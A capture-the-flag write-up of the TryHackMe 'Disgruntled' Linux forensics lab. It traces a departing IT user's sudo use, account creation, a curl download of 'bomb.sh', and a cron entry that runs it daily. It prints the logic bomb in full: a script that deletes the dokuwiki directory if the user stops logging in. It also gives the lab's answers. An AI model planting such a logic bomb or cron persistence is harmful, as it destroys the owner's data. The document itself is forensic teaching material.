<h2 align="left">Linux Forensics Fundamentals</h2>
<p align="left">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Lab-Disgruntled-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Difficulty-Easy-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Category-Linux%20Forensics-24292e?style=flat-square" /> &nbsp;
  <img src="https://img.shields.io/badge/Solved-2024-darkgreen?style=flat-square" /> &nbsp;
  <a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=flat-square&logo=github&color=24292e" alt="Follow Rosana on GitHub" /></a> &nbsp;
  <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white" alt="Connect on LinkedIn" /></a>
</p> 

<br>
<br>



<p>Hey, kid! Good, you’re here!<br>

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.<br>

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.</p>


<p>Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.<br>

My advice: Look at the privileged commands that were run. That should get you started.</p>

<br>
<p><em>Answer the questions below</em></p>


<br>
<p>The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND? Hint: Check the sudo execution history.<br>
<code>dokuwiki</code></p>

```bash
...:/var/log# grep -iE install auth.log.1
Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:20:55 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /usr/share/dokuwiki/VERSION /usr/share/dokuwiki/bin /usr/share/dokuwiki/doku.php /usr/share/dokuwiki/feed.php /usr/share/dokuwiki/inc /usr/share/dokuwiki/index.php /usr/share/dokuwiki/install.php /usr/share/dokuwiki/lib /usr/share/dokuwiki/vendor -R
```

<img width="708" height="161" alt="image" src="https://github.com/user-attachments/assets/5821af98-8ec9-4a54-bf29-d5b6780d07ea" />

<br>
<br>
<p>What was the present working directory (PWD) when the previous command was run?<br>
<code>/home/cybert</code></p>

<img width="708" height="161" alt="image" src="https://github.com/user-attachments/assets/31497929-59dd-48a1-a25c-39fe9d5f7dc0" />

<br>
<br>  
<p>Which user was created after the package from the previous task was installed? Hint: Look for the "adduser" command in the logs.<br>
<code>it-admin</code></p>

```bash
...:/var/log# grep -iE useradd auth.log.1
...
Dec 22 07:58:09 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m cybert -s /bin/bash
Dec 22 07:58:09 ip-10-10-158-38 useradd[1970]: new group: name=cybert, GID=1001
Dec 22 07:58:09 ip-10-10-158-38 useradd[1970]: new user: name=cybert, UID=1001, GID=1001, home=/home/cybert, shell=/bin/bash
Dec 28 06:26:53 ip-10-10-168-55 useradd[15328]: new user: name=it-admin, UID=1002, GID=1002, home=/home/it-admin, shell=/bin/bash
Feb 21 18:00:09 ip-10-10-237-12 useradd[25459]: new user: name=systemd-timesync, UID=111, GID=116, home=/run/systemd, shell=/usr/sbin/nologin, from=/dev/pts/2
Feb 21 18:02:39 ip-10-10-237-12 useradd[6687]: new user: name=tss, UID=112, GID=119, home=/var/lib/tpm, shell=/bin/false, from=/dev/pts/2
Feb 21 18:03:11 ip-10-10-237-12 useradd[10527]: new user: name=tcpdump, UID=113, GID=120, home=/nonexistent, shell=/usr/sbin/nologin, from=/dev/pts/2
Feb 21 18:05:30 ip-10-10-237-12 useradd[4603]: new user: name=fwupd-refresh, UID=114, GID=121, home=/run/systemd, shell=/usr/sbin/nologin, from=/dev/pts/2
```

<br>
<p>A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS) Hint: The "visudo" is called when editing the /etc/sudoers file. Look for this command in the logs.<br>
<code>Dec 28 06:27:34</code></p>

```bash
...0:/var/log# grep -iE visudo auth.log.1
Dec 22 07:58:24 ... sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:27:34 ... sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```

```bash
...:/# ps -eo user,pid,start,command
USER         PID  STARTED COMMAND
...
root         679 18:41:41 /usr/sbin/cron -f
message+     680 18:41:41 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-acti
root         689 18:41:41 /usr/sbin/irqbalance --foreground
root         691 18:41:41 /usr/bin/lxcfs /var/lib/lxcfs
root         692 18:41:41 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         695 18:41:41 /usr/lib/policykit-1/polkitd --no-debug
syslog       697 18:41:41 /usr/sbin/rsyslogd -n -iNONE
root         698 18:41:41 /snap/amazon-ssm-agent/11320/amazon-ssm-agent
root         709 18:41:41 /usr/lib/snapd/snapd
root         715 18:41:41 /lib/systemd/systemd-logind
root         718 18:41:41 /usr/lib/udisks2/udisksd
daemon       723 18:41:41 /usr/sbin/atd -f
root         739 18:41:42 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root         753 18:41:42 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         756 18:41:42 /usr/sbin/ModemManager
root         784 18:41:42 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-f
root         791 18:41:42 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         823 18:41:44 /usr/sbin/apache2 -k start
www-data     830 18:41:46 /usr/sbin/apache2 -k start
www-data     831 18:41:46 /usr/sbin/apache2 -k start
www-data     832 18:41:46 /usr/sbin/apache2 -k start
www-data     833 18:41:46 /usr/sbin/apache2 -k start
www-data     834 18:41:46 /usr/sbin/apache2 -k start
root        1180 18:42:00 /snap/amazon-ssm-agent/11320/ssm-agent-worker
root        1362 18:46:08 sshd: root@pts/0
root        1365 18:46:17 /lib/systemd/systemd --user
root        1366 18:46:17 (sd-pam)
root        1451 18:46:18 -bash
root        1468 18:48:11 [kworker/0:2-cgroup_destroy]
root        1483 18:48:27 [kworker/1:0-cgroup_destroy]
root        1639 18:53:46 [kworker/1:1-cgroup_destroy]
root        1650 18:56:32 [kworker/u4:1-events_unbound]
root        1652 18:56:58 ps -eo user,pid,start,command
```

<br>
<p>A script file was opened using the "vi" text editor. What is the name of this file?<br>
<code>bomb.sh</code></p>

```bash
...:/home/it-admin# ls -lah
total 28K
drwxr-xr-x 2 it-admin it-admin 4.0K Dec 28  2022 .
drwxr-xr-x 5 root     root     4.0K Dec 28  2022 ..
-rw------- 1 it-admin it-admin  177 Dec 28  2022 .bash_history
-rw-r--r-- 1 it-admin it-admin  220 Dec 28  2022 .bash_logout
-rw-r--r-- 1 it-admin it-admin 3.7K Dec 28  2022 .bashrc
-rw-r--r-- 1 it-admin it-admin  807 Dec 28  2022 .profile
-rw------- 1 root     root      879 Dec 28  2022 .viminfo
```

```bash
...:/home/it-admin# cat .bash_history
whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
```

```bash
...:/home/it-admin# cat .bash_history
whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
```


<br>
<p>What is the command used that created the file <code>bomb.sh</code>? Hint: The command was run by a different user account. Look at the ".bash_history" found in the user's home directory.<br>
<code>curl 10.10.158.38:8080/bomb.sh --output bomb.sh</code></p>

<br>
<p>The file was renamed and moved to a different directory. What is the full path of this file now? Hint: The vi text editor can edit and save files to a different location. Check out the history of vi by looking for ".viminfo".<br>
<code>/bin/os-update.sh</code></p>


```bash
...:/home/it-admin# cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  6  0  /bin/os-update.sh
|4,48,6,0,1672208992,"/bin/os-update.sh"

# Jumplist (newest first):
-'  6  0  /bin/os-update.sh
|4,39,6,0,1672208992,"/bin/os-update.sh"
-'  1  0  /bin/os-update.sh
|4,39,1,0,1672208955,"/bin/os-update.sh"

# History of marks within files (newest to oldest):

> /bin/os-update.sh
	*	1672208988	0
	"	6	0
```


<br>
<p>When was the file from the penultimate question last modified? (Format: Month Day HH:MM) Hint: Go to the file location and use the "ls -al --full-time" command.<br>
<code>Dec 28 06:29</code></p>

```bash
...:/# find / -type f -name os-update.sh -exec ls --full-time {} \; 2>/dev/null
-rw-r--r-- 1 root root 325 2022-12-28 06:29:43.998004273 +0000 /bin/os-update.sh
```

```bash
...:/home/it-admin# stat /bin/os-update.sh
  File: /bin/os-update.sh
  Size: 325       	Blocks: 8          IO Block: 4096   regular file
Device: 10301h/66305d	Inode: 26          Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-06-29 18:18:26.253249784 +0000
Modify: 2022-12-28 06:29:43.998004273 +0000
Change: 2022-12-28 06:29:43.998004273 +0000
 Birth: -
```

<br>
<p>What is the name of the file that will get created when the file from the first question executes? Hint: Open the malicious file and figure out the answer from the code.<br>
<code>goodbye.txt</code></p>


```bash
...:/home/it-admin# nano /bin/os-update.sh
```

```bash
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
```

<br>
<p>At what time will the malicious file trigger? (Format: HH:MM AM/PM)<br>
<code>08:00 AM</code></p>

<p>

- 0 8 *** root /bin/os-update.sh<br>Using standard cron syntax (minute hour dom month dow), this means the script runs every day at 08:00, executed by root.</p>

```bash
...:/# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
0 8	* * *	root	/bin/os-update.sh
#
```

<br>
<br>
<p>"We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure."</p>


<br>
<br>

<div align="center"><p>

|<h3>System and OS Information</h3><p><strong>OS release information</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /etc/os-release<br>Can be read using cat, vim or any text editor or viewer<br><br><strong>User accounts information</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /etc/passwd<br>Can be read using cat, vim or any text editor or viewer<br><br><strong>User group information</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /etc/group<br>Can be read using cat, vim or<br>any text editor or viewer<br><br><strong>Sudoers list</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /etc/sudoers<br>Can be read using cat, vim or any text editor or viewer.<br>Needs sudo or root permissions to access<br><br><strong>Login information</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /var/log/wtmp<br>Can be read using last utility<br><br><strong>Authentication logs</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /var/log/auth.log<br>Can be read using cat, vim or any text editor or viewer.<br>Use grep for better filtering.<br>Might also have auth.log1, auth.log2 etc as log files that have been rotated.</p>|
|:-----------------------------------------------------------------|
|<h3>System Configuration</h3><p><strong>Hostname</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp;  /etc/hostname<br>Can be read using cat, vim or any text editor or viewer<br><br><strong>Timezone information</strong>:<br>Location: &nbsp;&nbsp;  /etc/timezone<br>Can be read using cat, vim or any text editor or viewer<br><br><strong>Network Interfaces</strong>:<br>Location: &nbsp;&nbsp;  /etc/network/interfaces<br>Can be read using cat, vim or any text editor or viewer<br>Command: <code>ip address show</code><br>The above command is suitable only for live analysis<br><br><strong>Open network connections</strong>:<br> Command: <code>netstat –natp</code><br>The above command is suitable only for live analysis<br><br><strong>Running processes</strong>:<br>Command: <code>ps aux</code><br>The above command is suitable only for live analysis<br><br><strong>DNS information</strong>:<br>Location: &nbsp;&nbsp;&nbsp;&nbsp;  /etc/hosts for hostname resolutions<br>Can be read using cat, vim or any text editor or viewer<br>Location: &nbsp;&nbsp;&nbsp;&nbsp; /etc/resolv.conf for information about DNS servers<br>Can be read using cat, vim or any text editor or viewer</p>|
|<h3>Persistence Mechanism</h3><p>Cron jobs:<br>Location: /etc/crontab<br>Can be read using cat, vim or any text editor or viewer<br><br>Services:<br>Location: /etc/init.d/<br>Registered services are present in this directory<br><br>Bash shell startup:<br>Location: /home/<user>/.bashrc for each user<br>Locations: /etc/bash.bashrc and /etc/profile for system wide settings. Can be read using cat,<br>vim or any text editor or viewer</p|
|<h3>Evidence of execution</h3><p>Authentication logs:<br>Location: /var/log/auth.log* - grep -i COMMAND;<br>the grep can be used to filter the results. Can be read using cat,<br>vim or any text editor or viewer<br><br>Bash history:<br>Location: /home/<user>/.bash_history<br>Can be read using cat, vim or any text editor or viewer<br><br>Vim history:<br>Location: /home/<user>/.viminfo<br>Can be read using cat, vim or any text editor or viewer</p>|
|<h3>Log Files</h3><p>Syslogs:<br>Location: /var/log/syslog<br>Can be read using cat, vim or any text editor or viewer.<br>Use grep or similar utility to filter results as per requirement<br><br>Authentication logs:<br>Location: /var/log/auth.log<br>Can be read using cat, vim or any text editor or viewer.<br>Use grep or similar utility to filter results as per requirement<br><br>Third-party logs:<br>Location: /var/log<br>Logs for each third-party application can be found in their<br>specific directories in this location|

</p></div><br>
